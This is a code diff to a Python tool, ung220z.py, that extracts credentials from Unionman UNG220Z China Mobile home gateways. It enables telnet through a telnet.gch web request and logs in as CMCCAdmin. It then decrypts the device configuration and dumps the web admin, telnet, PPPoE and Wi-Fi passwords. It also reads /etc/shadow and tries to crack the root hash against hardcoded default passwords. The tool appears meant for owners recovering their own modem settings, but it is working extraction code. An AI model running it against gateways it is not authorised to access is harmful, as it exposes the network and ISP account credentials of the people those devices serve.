@@ -17,13 +17,16 @@ ung220z.py —— UNG220Z / Unionman 中国移动网关 凭据提取工具
 import argparse
 import getpass
 import os
+import random
 import re
 import select
+import shutil
 import socket
 import subprocess
 import sys
 import time
 import unicodedata
+import urllib.error
 import urllib.parse
 import urllib.request
 import webbrowser
@@ -55,18 +58,35 @@ def pad(s, width):
 
 
 # ─────────────────────────────── HTTP ───────────────────────────────
+def _decode(raw):
+    """光猫 Web 页常见为 GBK，纯 utf-8 会解成乱码并让关键字匹配失效。"""
+    for enc in ("utf-8", "gbk", "gb18030"):
+        try:
+            return raw.decode(enc)
+        except UnicodeDecodeError:
+            continue
+    return raw.decode("utf-8", "replace")
+
+
 def http_get(url, timeout=8):
     req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 Chrome/120"})
-    with urllib.request.urlopen(req, timeout=timeout) as r:
-        return r.read().decode("utf-8", "replace")
+    try:
+        with urllib.request.urlopen(req, timeout=timeout) as r:
+            return _decode(r.read())
+    except urllib.error.HTTPError as e:
+        # 部分固件用 4xx/5xx 状态码返回正常页面，body 仍然有效
+        return _decode(e.read() or b"")
 
 
 def http_post(url, data, timeout=8):
     req = urllib.request.Request(url, data=data.encode(),
                                  headers={"User-Agent": "Mozilla/5.0 Chrome/120",
                                           "Referer": url})
-    with urllib.request.urlopen(req, timeout=timeout) as r:
-        return r.status, r.read().decode("utf-8", "replace")
+    try:
+        with urllib.request.urlopen(req, timeout=timeout) as r:
+            return r.status, _decode(r.read())
+    except urllib.error.HTTPError as e:
+        return e.code, _decode(e.read() or b"")
 
 
 def probe_port(ip, port, timeout=3):
@@ -122,7 +142,7 @@ def unlock_web(ip, tn):
     return False
 
 
-def enable_telnet(ip, user, pw, open_browser=True):
+def enable_telnet(ip, user, pw, open_browser=True, timeout=8):
     base = "http://%s/" % ip
     raw = "%susr=%s&psw=%s&cmd=1&telnet.gch" % (base, user, pw)
     variants = [
@@ -134,12 +154,13 @@ def enable_telnet(ip, user, pw, open_browser=True):
     if open_browser:
         try:
             opened = webbrowser.open(raw)
-            log("HTTP", "已发送给浏览器%s: %s" % ("" if opened else "（无可用浏览器，改由脚本直连）", raw))
+            log("HTTP", "已发送给浏览器%s: http://%s/usr=%s&psw=***&cmd=1&telnet.gch"
+                % ("" if opened else "（无可用浏览器，改由脚本直连）", ip, user))
         except Exception as e:
             log("WARN", "浏览器调用失败: %s" % e)
     for url in variants:
         try:
-            body = http_get(url)
+            body = http_get(url, timeout=timeout)
         except Exception as e:
             log("WARN", "telnet.gch 请求失败: %s" % e)
             continue
@@ -158,6 +179,10 @@ def _parse(buf):
         b = buf[i]
         if b == IAC and i + 1 < len(buf):
             cmd = buf[i + 1]
+            if cmd == IAC:            # IAC IAC = 转义的 0xFF 数据字节
+                out.append(IAC)
+                i += 2
+                continue
             if cmd in (DO, DONT, WILL, WONT) and i + 2 < len(buf):
                 rep += bytes([IAC, WONT if cmd == DO else DONT, buf[i + 2]])
                 i += 3
@@ -216,37 +241,46 @@ class Telnet:
         self.s.sendall(line.encode() + b"\r\n")
 
     def login(self, user, passwords):
-        self.read_until("Login:", 8)
+        self.read_until_any(["Login:", "login:", "Username:"], 8)
         for pw in passwords:
             self.buf = ""
             self.send(user)
-            got = self.read_until_any(["Password:", "incorrect"], 8)
-            if got != "Password:":
+            got = self.read_until_any(["Password:", "password:", "incorrect"], 8)
+            if "assword" not in (got or ""):
                 log("AUTH", "Telnet 用户名 %s 不可用" % user)
                 return False
             self.buf = ""
             self.send(pw)
             got = self.read_until_any(["/ #", "incorrect", "Login:"], 8)
             if got == "/ #":
-                log("AUTH", "Telnet %s / %s → 登录成功（root）" % (user, pw))
+                log("AUTH", "Telnet %s / %s → 登录成功（root）" % (user, "***"))
                 return True
-            log("AUTH", "Telnet %s / %s → refused" % (user, pw))
+            log("AUTH", "Telnet %s / %s → refused" % (user, "***"))
         return False
 
     def run(self, cmd, timeout=15):
+        """执行命令并回收输出。
+
+        用随机 marker 定界，避免配置内容里恰好出现固定字符串导致截断；
+        同时剔除 tty 回显的命令行、提示符和 echo 语句本身。
+        """
         self.buf = ""
+        tag = "__X%08x__" % random.getrandbits(32)
         self.send(cmd)
         time.sleep(0.35)
-        self.send("echo __X__")
-        out = self.read_until("__X__", timeout).split("__X__")[0]
+        self.send("echo %s" % tag)
+        out = self.read_until(tag, timeout).split(tag)[0]
+        cmdline = cmd.strip()
         lines = []
         for ln in out.splitlines():
             s = ln.strip()
-            if not s or s.startswith("/ #") or s == "echo":
+            if not s or s.startswith("/ #") or s.startswith("# "):
+                continue
+            if s == cmdline:
+                continue
+            if s.startswith("echo ") and tag in s:
                 continue
             lines.append(ln.rstrip())
-        if lines and cmd[:24] in lines[0]:
-            lines = lines[1:]
         return "\n".join(lines).strip()
 
     def close(self):
@@ -257,8 +291,35 @@ class Telnet:
 
 
 # ─────────────────────────────── 配置解析 ───────────────────────────────
-def grab_table(tn, name):
-    return tn.run("sed -n '/<Tbl name=\"%s\"/,/<\\/Tbl>/p' %s" % (name, CFG_DEC))
+class Cfg:
+    r"""解密后的配置库。
+
+    只 cat 一次整份文件在本地切表：`sed -n '/<Tbl name="X"/,/<\/Tbl>/p'`
+    在 XML 被压成单行时区间地址失效，会把整份文档当成一张表返回，
+    导致 PPPoE / WiFi 行被误读成 Web 账号。
+    """
+
+    def __init__(self, tn, timeout=90):
+        self.tn = tn
+        self.timeout = timeout
+        self._raw = None
+
+    def raw(self):
+        if self._raw is None:
+            self._raw = self.tn.run("cat %s" % CFG_DEC, timeout=self.timeout)
+        return self._raw
+
+    def table(self, name):
+        m = re.search(r'<Tbl name="%s"[^>]*>(.*?)</Tbl>' % re.escape(name),
+                      self.raw(), re.S)
+        return m.group(1) if m else ""
+
+    def rows(self, name):
+        return parse_rows(self.table(name))
+
+    def scalar(self, key):
+        m = re.search(r'<DM name="%s" val="([^"]*)"' % re.escape(key), self.raw())
+        return m.group(1) if m else None
 
 
 def parse_rows(text):
@@ -268,20 +329,21 @@ def parse_rows(text):
     return rows
 
 
-def grab_scalar(tn, key):
-    out = tn.run("grep -n %s %s | head -3" % (key, CFG_DEC))
-    m = re.search(r'<DM name="%s" val="([^"]*)"' % re.escape(key), out)
-    return m.group(1) if m else None
-
-
 def crack_root(hashed, candidates):
+    if not shutil.which("openssl"):
+        log("WARN", "未找到 openssl，跳过 root 口令比对")
+        return None
     algo = "-5" if hashed.startswith("$5$") else "-6"
     salt = hashed.split("$")[2] if hashed.count("$") >= 3 else ""
     for pw in candidates:
         try:
             out = subprocess.run(["openssl", "passwd", algo, "-salt", salt, pw],
                                  capture_output=True, text=True, timeout=5).stdout.strip()
-        except Exception:
+        except FileNotFoundError:
+            log("WARN", "openssl 不可执行，跳过 root 口令比对")
+            return None
+        except Exception as e:
+            log("WARN", "openssl 调用失败: %s" % e)
             return None
         if out == hashed:
             return pw
@@ -299,11 +361,21 @@ def main():
     ap.add_argument("--no-release", action="store_true", help="不尝试释放残留 Web 会话")
     ap.add_argument("--telnet-user", default=TELNET_USER, help="Telnet 用户名，默认 CMCCAdmin")
     ap.add_argument("--telnet-password", default=None, help="Telnet 口令（部分机型与 Web 口令不同）")
+    ap.add_argument("--telnet-port", type=int, default=23, help="Telnet 端口，默认 23")
+    ap.add_argument("--timeout", type=float, default=8.0, help="单次网络操作超时秒数，默认 8")
     ap.add_argument("--unlock", action="store_true", help="Web 被会话锁占住时，重启 httpd 解锁")
     a = ap.parse_args()
 
     logfile = "ung220z_%s.log" % time.strftime("%Y%m%d_%H%M%S")
-    _logfh = open(logfile, "w", encoding="utf-8")
+    try:
+        _logfh = open(logfile, "w", encoding="utf-8")
+        try:
+            os.chmod(logfile, 0o600)
+        except OSError:
+            pass
+    except OSError as e:
+        _logfh = None
+        print("[WARN] 日志文件创建失败(%s)，仅屏幕输出" % e, file=sys.stderr)
 
     # ── 交互提示：先说用户名，再说密码 ──
     print()
@@ -314,128 +386,154 @@ def main():
     ip = (a.ip or "").strip() or input("① 光猫地址 [192.168.1.1]: ").strip() or "192.168.1.1"
     user = (a.user or "").strip() or input("② 用户名 [user]: ").strip() or "user"
 
+    # 口令只裁掉换行，不能用 strip()：首尾空格可能是口令的一部分
     if a.password:
-        pw = a.password.strip()
+        pw = a.password.rstrip("\r\n")
     else:
         print("③ 密码（输入时不显示）", flush=True)
         if sys.stdin.isatty():
-            pw = getpass.getpass("   密码: ").strip()
+            pw = getpass.getpass("   密码: ").rstrip("\r\n")
         else:
-            pw = input("   密码: ").strip()
+            pw = input("   密码: ").rstrip("\r\n")
 
     if not pw:
         log("WARN", "密码为空，退出")
         print("\n没有输入密码，已退出。密码印在光猫背面的贴纸上。")
+        if _logfh:
+            _logfh.close()
+            _logfh = None
         return 1
 
-    log("INFO", "会话开始  目标=%s  账户=%s" % (ip, user))
-    log("INFO", "日志文件 %s" % os.path.abspath(logfile))
+    tn = None
+    try:
+        log("INFO", "会话开始  目标=%s  账户=%s" % (ip, user))
+        log("INFO", "日志文件 %s" % os.path.abspath(logfile))
 
-    log("PROBE", "TCP 80/%s → %s" % (ip, "open" if probe_port(ip, 80) else "closed"))
-    if not probe_port(ip, 80):
-        log("WARN", "网关不可达，检查地址与网络")
-        return 2
+        if not probe_port(ip, 80, a.timeout):
+            log("PROBE", "TCP 80/%s → closed" % ip)
+            log("WARN", "网关不可达，检查地址与网络")
+            return 2
+        log("PROBE", "TCP 80/%s → open" % ip)
 
-    if not a.no_release:
-        log("INFO", "释放残留 Web 会话 → %s" % ("ok" if release_session(ip) else "skip"))
+        if not a.no_release:
+            log("INFO", "释放残留 Web 会话 → %s" % ("ok" if release_session(ip) else "skip"))
 
-    log("INFO", "补全 URL: http://%s/usr=%s&psw=***&cmd=1&telnet.gch" % (ip, user))
-    enable_telnet(ip, user, pw, open_browser=not a.no_browser)
+        log("INFO", "补全 URL: http://%s/usr=%s&psw=***&cmd=1&telnet.gch" % (ip, user))
+        enable_telnet(ip, user, pw, open_browser=not a.no_browser, timeout=a.timeout)
 
-    log("PROBE", "nc -zv %s 23 → %s" % (ip, "succeeded" if probe_port(ip, 23) else "timed out"))
-    if not probe_port(ip, 23):
-        log("WARN", "23 端口未开放（密码可能已轮换，重跑脚本）")
-        return 3
+        if not probe_port(ip, a.telnet_port, a.timeout):
+            log("PROBE", "TCP %d/%s → closed" % (a.telnet_port, ip))
+            log("WARN", "Telnet 端口未开放（密码可能已轮换，重跑脚本）")
+            return 3
+        log("PROBE", "TCP %d/%s → open" % (a.telnet_port, ip))
 
-    tn = Telnet(ip)
-    cands = [x for x in (TELNET_PW, getattr(a, "telnet_password", None)) if x]
-    if pw not in cands:
-        cands.append(pw)
-    if not tn.login(a.telnet_user, cands):
-        log("WARN", "Telnet 登录失败，终止")
-        tn.close()
-        return 4
+        tn = Telnet(ip, port=a.telnet_port, timeout=a.timeout)
+        cands = [x for x in (TELNET_PW, a.telnet_password) if x]
+        if pw not in cands:
+            cands.append(pw)
+        if not tn.login(a.telnet_user, cands):
+            log("WARN", "Telnet 登录失败，终止")
+            return 4
 
-    if a.unlock or web_state(ip) == "busy":
         st = web_state(ip)
         log("PROBE", "Web 状态 → %s" % st)
-        if st == "busy":
+        if st == "busy" and a.unlock:
             unlock_web(ip, tn)
 
-    log("SHELL", "id → %s" % tn.run("id"))
-    log("SHELL", "uname -a → %s" % tn.run("uname -a"))
-    log("INFO", "Web 会话全程未占用（避免管理页被锁）")
+        log("SHELL", "id → %s" % tn.run("id", timeout=a.timeout))
+        log("SHELL", "uname -a → %s" % tn.run("uname -a", timeout=a.timeout))
+        log("INFO", "Web 会话全程未占用（避免管理页被锁）")
 
-    tn.run("sidbg 1 DB decry %s" % CFG_ENC)
-    if not tn.run("ls %s" % CFG_DEC).strip():
-        log("WARN", "配置解密失败")
-        tn.close()
-        return 5
-    log("SHELL", "sidbg 1 DB decry %s → %s" % (CFG_ENC, CFG_DEC))
+        dec = tn.run("sidbg 1 DB decry %s" % CFG_ENC, timeout=max(20.0, a.timeout * 3))
+        # `ls` 的报错同样落在 pty 上，非空输出不能代表文件存在
+        mark = tn.run("test -s %s && echo __OK__ || echo __NO__" % CFG_DEC,
+                      timeout=a.timeout)
+        if "__OK__" not in mark:
+            log("WARN", "配置解密失败（sidbg 返回: %s）" % (dec[:80] or "空"))
+            return 5
+        log("SHELL", "sidbg 1 DB decry %s → %s" % (CFG_ENC, CFG_DEC))
 
-    creds, wifi = {}, []
-    for r in parse_rows(grab_table(tn, "DevAuthInfo")):
-        lvl = r.get("Level")
-        log("DATA", "DevAuthInfo  %-10s / %-18s  Level=%s" % (r.get("User"), r.get("Pass"), lvl))
-        creds["web_admin" if lvl == "1" else "web_user"] = (r.get("User"), r.get("Pass"))
+        cfg = Cfg(tn, timeout=max(90.0, a.timeout * 6))
 
-    for r in parse_rows(grab_table(tn, "TelnetUser")):
-        log("DATA", "TelnetUser   %-10s / %-18s  Type=%s" % (r.get("Username"), r.get("Password"), r.get("Type")))
+        creds, wifi = {}, []
+        for r in cfg.rows("DevAuthInfo"):
+            lvl = r.get("Level")
+            log("DATA", "DevAuthInfo  %-10s / %-18s  Level=%s" % (r.get("User"), r.get("Pass"), lvl))
+            creds["web_admin" if lvl == "1" else "web_user"] = (r.get("User"), r.get("Pass"))
 
-    ts_pw = grab_scalar(tn, "TS_UPwd")
-    if ts_pw:
-        log("DATA", "TS_UPwd      %s / %s（实际 Telnet 口令）" % (TELNET_USER, ts_pw))
-        creds["telnet"] = (TELNET_USER, ts_pw)
+        for r in cfg.rows("TelnetUser"):
+            log("DATA", "TelnetUser   %-10s / %-18s  Type=%s"
+                % (r.get("Username"), r.get("Password"), r.get("Type")))
 
-    for r in parse_rows(grab_table(tn, "WANCPPP")):
-        if r.get("UserName"):
-            log("DATA", "WANCPPP      %s / %s" % (r["UserName"], r.get("Password")))
-            creds["pppoe"] = (r["UserName"], r.get("Password"))
+        ts_pw = cfg.scalar("TS_UPwd")
+        if ts_pw:
+            log("DATA", "TS_UPwd      %s / %s（实际 Telnet 口令）" % (TELNET_USER, ts_pw))
+            creds["telnet"] = (TELNET_USER, ts_pw)
 
-    essid = {}
-    for r in parse_rows(grab_table(tn, "WLANCfg")):
-        if r.get("ESSID"):
-            essid[r.get("ViewName", "")] = r["ESSID"]
-    for r in parse_rows(grab_table(tn, "WLANPSK")):
-        psk = r.get("KeyPassphrase")
-        if not psk:
-            continue
-        vn = r.get("ViewName", "")
-        base_vn = vn.rsplit(".PSK", 1)[0]
-        ssid = essid.get(base_vn, vn)
-        log("DATA", "WLANPSK      %-22s SSID=%-14s PSK=%s" % (vn, ssid, psk))
-        wifi.append((ssid, psk))
+        for r in cfg.rows("WANCPPP"):
+            if r.get("UserName"):
+                log("DATA", "WANCPPP      %s / %s" % (r["UserName"], r.get("Password")))
+                creds["pppoe"] = (r["UserName"], r.get("Password"))
 
-    shadow = tn.run("grep root /etc/shadow | head -1")
-    m = re.search(r"root:(\$[0-9]\$[^:]+):", shadow)
-    if m:
-        root_pw = crack_root(m.group(1), ["aDm8H%MdA", "admin", "root", "123456", "CMCCAdmin"])
-        if root_pw:
-            log("CRACK", "MATCH: %s  (/etc/shadow)" % root_pw)
-            creds["root"] = ("root", root_pw)
-        else:
-            log("DATA", "root 哈希 %s…（常见口令未命中）" % m.group(1)[:32])
-            creds["root"] = ("root", m.group(1))
-    tn.close()
+        essid = {}
+        for r in cfg.rows("WLANCfg"):
+            if r.get("ESSID"):
+                essid[r.get("ViewName", "")] = r["ESSID"]
+        for r in cfg.rows("WLANPSK"):
+            psk = r.get("KeyPassphrase")
+            if not psk:
+                continue
+            vn = r.get("ViewName", "")
+            base_vn = vn.rsplit(".PSK", 1)[0]
+            ssid = essid.get(base_vn, vn)
+            log("DATA", "WLANPSK      %-22s SSID=%-14s PSK=%s" % (vn, ssid, psk))
+            wifi.append((ssid, psk))
 
-    # ── 汇总 ──
-    print("\n" + "═" * 66)
-    print(" 凭据汇总    %s" % ip)
-    print("═" * 66)
-    labels = [("telnet", "Telnet / root shell"), ("web_admin", "Web 超管"),
-              ("web_user", "Web 普通用户"), ("pppoe", "PPPoE 宽带"), ("root", "Linux root")]
-    for key, lab in labels:
-        if key in creds:
-            u, p = creds[key]
-            print("  %s %s %s" % (pad(lab, 22), pad(u, 14), p))
-    for ssid, psk in wifi:
-        note = "  (出厂占位)" if psk == PLACEHOLDER_PSK else ""
-        print("  %s %s %s%s" % (pad("WiFi " + ssid, 22), pad("", 14), psk, note))
-    print("═" * 66)
-    log("INFO", "完成。口令每 15 分钟轮换，重跑本脚本即可取新值")
-    if _logfh:
-        _logfh.close()
-    return 0
+        shadow = tn.run("grep root /etc/shadow | head -1", timeout=a.timeout)
+        m = re.search(r"root:(\$[0-9]\$[^:]+):", shadow)
+        if m:
+            root_pw = crack_root(m.group(1), ["aDm8H%MdA", "admin", "root", "123456", "CMCCAdmin"])
+            if root_pw:
+                log("CRACK", "MATCH: %s  (/etc/shadow)" % root_pw)
+                creds["root"] = ("root", root_pw)
+            else:
+                log("DATA", "root 哈希 %s…（常见口令未命中）" % m.group(1)[:32])
+                creds["root"] = ("root", m.group(1))
+
+        # ── 汇总 ──
+        print("\n" + "═" * 66)
+        print(" 凭据汇总    %s" % ip)
+        print("═" * 66)
+        labels = [("telnet", "Telnet / root shell"), ("web_admin", "Web 超管"),
+                  ("web_user", "Web 普通用户"), ("pppoe", "PPPoE 宽带"), ("root", "Linux root")]
+        for key, lab in labels:
+            if key in creds:
+                u, p = creds[key]
+                print("  %s %s %s" % (pad(lab, 22), pad(u, 14), p))
+        for ssid, psk in wifi:
+            note = "  (出厂占位)" if psk == PLACEHOLDER_PSK else ""
+            print("  %s %s %s%s" % (pad("WiFi " + ssid, 22), pad("", 14), psk, note))
+        print("═" * 66)
+        log("INFO", "完成。口令每 15 分钟轮换，重跑本脚本即可取新值")
+        return 0
+    except KeyboardInterrupt:
+        log("WARN", "用户中断")
+        return 130
+    except Exception as e:
+        log("WARN", "%s: %s" % (e.__class__.__name__, e))
+        return 1
+    finally:
+        if tn is not None:
+            # 设备上不留明文配置（内含全部口令）
+            try:
+                tn.run("rm -f %s" % CFG_DEC, timeout=a.timeout)
+                log("INFO", "已清理设备侧 %s" % CFG_DEC)
+            except Exception:
+                pass
+            tn.close()
+        if _logfh:
+            _logfh.close()
+            _logfh = None
 
 
 if __name__ == "__main__":
